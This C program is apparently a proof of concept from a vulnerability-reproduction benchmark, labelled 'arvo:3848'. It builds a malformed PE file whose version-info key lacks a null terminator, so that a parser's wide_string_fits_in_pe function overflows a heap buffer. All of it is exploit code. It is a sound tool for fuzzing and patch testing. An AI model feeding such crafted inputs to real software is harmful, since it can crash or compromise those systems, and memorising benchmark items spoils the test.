#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:3848 */
/* Triggers: heap-buffer-overflow in wide_string_fits_in_pe */
/* Vuln class: heap_buffer_overflow */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write minimal MZ header */
    fputc('M', f); fputc('Z', f);
    for (int i = 0; i < 58; i++) fputc(0, f);

    /* PE offset at 0x3C */
    fseek(f, 0x3C, SEEK_SET);
    unsigned int pe_offset = 0x80;
    fwrite(&pe_offset, 4, 1, f);

    /* Write PE signature and COFF header at offset 0x80 */
    fseek(f, 0x80, SEEK_SET);
    fputc('P', f); fputc('E', f); fputc(0, f); fputc(0, f);

    unsigned short machine = 0x14C;
    fwrite(&machine, 2, 1, f);

    unsigned short num_sections = 1;
    fwrite(&num_sections, 2, 1, f);

    unsigned int timedate = 0;
    fwrite(&timedate, 4, 1, f);

    unsigned int symtab = 0;
    fwrite(&symtab, 4, 1, f);

    unsigned int numsyms = 0;
    fwrite(&numsyms, 4, 1, f);

    unsigned short opt_hdr_size = 0xE0;
    fwrite(&opt_hdr_size, 2, 1, f);

    unsigned short chars = 0x102;
    fwrite(&chars, 2, 1, f);

    /* Optional header - PE32 */
    unsigned short magic = 0x10B;
    fwrite(&magic, 2, 1, f);

    fputc(14, f); fputc(0, f);

    unsigned int zero = 0;
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);

    unsigned int image_base = 0x400000;
    fwrite(&image_base, 4, 1, f);

    unsigned int sect_align = 0x1000;
    unsigned int file_align = 0x200;
    fwrite(&sect_align, 4, 1, f);
    fwrite(&file_align, 4, 1, f);

    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    unsigned int size_of_image = 0x4000;
    fwrite(&size_of_image, 4, 1, f);
    unsigned int size_of_headers = 0x200;
    fwrite(&size_of_headers, 4, 1, f);
    fwrite(&zero, 4, 1, f);

    unsigned short subsystem = 2;
    fwrite(&subsystem, 2, 1, f);

    unsigned short dll_chars = 0;
    fwrite(&dll_chars, 2, 1, f);

    unsigned int stack_reserve = 0x100000;
    unsigned int stack_commit = 0x1000;
    unsigned int heap_reserve = 0x100000;
    unsigned int heap_commit = 0x1000;
    fwrite(&stack_reserve, 4, 1, f);
    fwrite(&stack_commit, 4, 1, f);
    fwrite(&heap_reserve, 4, 1, f);
    fwrite(&heap_commit, 4, 1, f);

    fwrite(&zero, 4, 1, f);
    unsigned int num_rvas = 16;
    fwrite(&num_rvas, 4, 1, f);

    /* Data directory entries */
    fwrite(&zero, 4, 1, f); fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f); fwrite(&zero, 4, 1, f);
    unsigned int res_rva = 0x1000;
    unsigned int res_size = 0x1000;
    fwrite(&res_rva, 4, 1, f);
    fwrite(&res_size, 4, 1, f);
    for (int i = 3; i < 16; i++) {
        fwrite(&zero, 4, 1, f);
        fwrite(&zero, 4, 1, f);
    }

    /* Section table - .rsrc */
    fputc('.', f); fputc('r', f); fputc('s', f); fputc('r', f); fputc('c', f);
    fputc(0, f); fputc(0, f); fputc(0, f);

    unsigned int vsize = 0x2000;
    fwrite(&vsize, 4, 1, f);

    unsigned int vaddr = 0x1000;
    fwrite(&vaddr, 4, 1, f);

    unsigned int raw_size = 0x2000;
    fwrite(&raw_size, 4, 1, f);

    unsigned int raw_ptr = 0x200;
    fwrite(&raw_ptr, 4, 1, f);

    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 2, 1, f);
    fwrite(&zero, 2, 1, f);

    unsigned int section_chars = 0x40000040;
    fwrite(&section_chars, 4, 1, f);

    /* Write resource directory structure at offset 0x1000 (RVA 0x1000) */
    fseek(f, 0x1000, SEEK_SET);

    /* Level 1: Root resource directory (16 bytes) */
    unsigned int res_zero = 0;
    unsigned short res_short = 0;
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_short, 2, 1, f);
    fwrite(&res_short, 2, 1, f);
    unsigned short num_named = 0;
    unsigned short num_id = 1;
    fwrite(&num_named, 2, 1, f);
    fwrite(&num_id, 2, 1, f);

    /* Type entry: ID=16 (RT_VERSION), OffsetToData with high bit set */
    unsigned int type_id = 16;
    unsigned int type_offset = 0x80000018;
    fwrite(&type_id, 4, 1, f);
    fwrite(&type_offset, 4, 1, f);

    /* Level 2: Type directory at offset 0x18 from root = file offset 0x1018 */
    fseek(f, 0x1018, SEEK_SET);
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_short, 2, 1, f);
    fwrite(&res_short, 2, 1, f);
    fwrite(&num_named, 2, 1, f);
    fwrite(&num_id, 2, 1, f);

    /* Language entry: ID=0x0409, OffsetToData pointing to subdir at offset 0x38 */
    unsigned int lang_id = 0x0409;
    unsigned int lang_offset = 0x80000038;
    fwrite(&lang_id, 4, 1, f);
    fwrite(&lang_offset, 4, 1, f);

    /* Level 3: Language directory at offset 0x38 from root = file offset 0x1038 */
    fseek(f, 0x1038, SEEK_SET);
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_short, 2, 1, f);
    fwrite(&res_short, 2, 1, f);
    fwrite(&num_named, 2, 1, f);
    unsigned short num_id_one = 1;
    fwrite(&num_id_one, 2, 1, f);

    /* Data entry pointer: ID=0, offset to data entry */
    unsigned int data_entry_id = 0;
    unsigned int data_entry_ptr = 0x48;
    fwrite(&data_entry_id, 4, 1, f);
    fwrite(&data_entry_ptr, 4, 1, f);

    /* Data entry at offset 0x48 from root = file offset 0x1048 */
    fseek(f, 0x1048, SEEK_SET);
    unsigned int data_rva = 0x2000;
    unsigned int data_size = 0x5A6;
    unsigned int code_page = 0;
    unsigned int reserved = 0;
    fwrite(&data_rva, 4, 1, f);
    fwrite(&data_size, 4, 1, f);
    fwrite(&code_page, 4, 1, f);
    fwrite(&reserved, 4, 1, f);

    /* Write version info data at offset 0x2000 (RVA 0x2000) */
    fseek(f, 0x2000, SEEK_SET);

    /* VS_VERSIONINFO: wLength=0x5A6, wValueLength=0x34, wType=0 */
    unsigned short wLength = 0x5A6;
    unsigned short wValueLength = 0x34;
    unsigned short wType = 0;
    fwrite(&wLength, 2, 1, f);
    fwrite(&wValueLength, 2, 1, f);
    fwrite(&wType, 2, 1, f);

    /* Key: L"VS_VERSION_INFO" (16 wide chars = 32 bytes) */
    unsigned short vs_key[] = {'V','S','_','V','E','R','S','I','O','N','_','I','N','F','O',0};
    fwrite(vs_key, sizeof(vs_key), 1, f);

    /* Padding to 4-byte align: 2 bytes */
    fputc(0, f); fputc(0, f);

    /* VS_FIXEDFILEINFO (52 bytes) */
    unsigned int sig = 0xFEEF04BD;
    unsigned int struc_ver = 0x00010000;
    unsigned int file_ver_ms = 0x00010000;
    unsigned int file_ver_ls = 0x00010000;
    unsigned int prod_ver_ms = 0x00010000;
    unsigned int prod_ver_ls = 0x00010000;
    unsigned int file_flags_mask = 0x3F;
    unsigned int file_flags = 0;
    unsigned int file_os = 0x40004;
    unsigned int file_type = 1;
    unsigned int file_subtype = 0;
    unsigned int file_date_ms = 0;
    unsigned int file_date_ls = 0;

    fwrite(&sig, 4, 1, f);
    fwrite(&struc_ver, 4, 1, f);
    fwrite(&file_ver_ms, 4, 1, f);
    fwrite(&file_ver_ls, 4, 1, f);
    fwrite(&prod_ver_ms, 4, 1, f);
    fwrite(&prod_ver_ls, 4, 1, f);
    fwrite(&file_flags_mask, 4, 1, f);
    fwrite(&file_flags, 4, 1, f);
    fwrite(&file_os, 4, 1, f);
    fwrite(&file_type, 4, 1, f);
    fwrite(&file_subtype, 4, 1, f);
    fwrite(&file_date_ms, 4, 1, f);
    fwrite(&file_date_ls, 4, 1, f);

    /* StringFileInfo: wLength=0x24, wValueLength=0, wType=1 */
    unsigned short sf_len = 0x24;
    unsigned short sf_val = 0;
    unsigned short sf_type = 1;
    fwrite(&sf_len, 2, 1, f);
    fwrite(&sf_val, 2, 1, f);
    fwrite(&sf_type, 2, 1, f);

    /* Key: L"StringFileInfo" (15 wide chars = 30 bytes) */
    unsigned short sf_key[] = {'S','t','r','i','n','g','F','i','l','e','I','n','f','o',0};
    fwrite(sf_key, sizeof(sf_key), 1, f);

    /* StringTable: wLength=0x1C, wValueLength=0, wType=1 */
    unsigned short st_len = 0x1C;
    unsigned short st_val = 0;
    unsigned short st_type = 1;
    fwrite(&st_len, 2, 1, f);
    fwrite(&st_val, 2, 1, f);
    fwrite(&st_type, 2, 1, f);

    /* Key: L"040904B0" (8 wide chars = 16 bytes) */
    unsigned short lang_key[] = {'0','4','0','9','0','4','B','0',0};
    fwrite(lang_key, sizeof(lang_key), 1, f);
    /* Padding: 2 bytes */
    fputc(0, f); fputc(0, f);

    /* String entry: wLength=0x50C, wValueLength=0x4E0, wType=1 */
    unsigned short str_len = 0x50C;
    unsigned short str_val = 0x4E0;
    unsigned short str_type = 1;
    fwrite(&str_len, 2, 1, f);
    fwrite(&str_val, 2, 1, f);
    fwrite(&str_type, 2, 1, f);

    /* Key: L"FileDescription" WITHOUT null terminator */
    /* This causes strnlen_w to read past the key into padding, making the */
    /* computed string_value pointer go far beyond the buffer */
    unsigned short fd_key[] = {'F','i','l','e','D','e','s','c','r','i','p','t','i','o','n'};
    fwrite(fd_key, sizeof(fd_key), 1, f);
    /* No padding - key has no null terminator */

    /* Immediately write the long wide string value */
    /* The ADD_OFFSET computation will use strnlen_w on the non-null-terminated key */
    /* which will read into these value bytes and return a huge length */
    for (int i = 0; i < 0x270; i++) {
        unsigned short wchar = 0x41;
        fwrite(&wchar, 2, 1, f);
    }

    fclose(f);
    return 0;
}